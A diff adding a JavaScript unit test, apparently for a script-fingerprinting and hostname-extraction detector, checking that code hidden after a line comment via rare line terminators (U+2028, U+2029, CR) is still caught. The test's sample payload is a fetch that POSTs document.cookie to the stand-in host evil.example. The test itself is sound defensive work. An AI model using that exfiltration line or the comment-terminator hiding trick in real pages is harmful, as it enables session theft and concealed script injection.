@@ -112,3 +112,12 @@ test('a template literal keeps the code it interpolates; one without interpolati
   // A quoted string that merely contains "${" is text, like any other string.
   assert.equal(templateOf('var label = "Total: ${amount}";').hash, templateOf('var label = "Sum: ${total}";').hash);
 });
+
+test('a line comment ends at every line terminator JavaScript knows, so nothing hides after one', () => {
+  const base = 'window.siteConfig = {theme: "light"};';
+  for (const sep of ['\u2028', '\u2029', '\r']) {
+    const hidden = `${base}//${sep}fetch("https://evil.example/c", {method: "POST", body: document.cookie});`;
+    assert.notEqual(templateOf(hidden).hash, templateOf(base).hash, JSON.stringify(sep));
+    assert.deepEqual(extractHostnames(hidden), ['evil.example'], JSON.stringify(sep));
+  }
+});
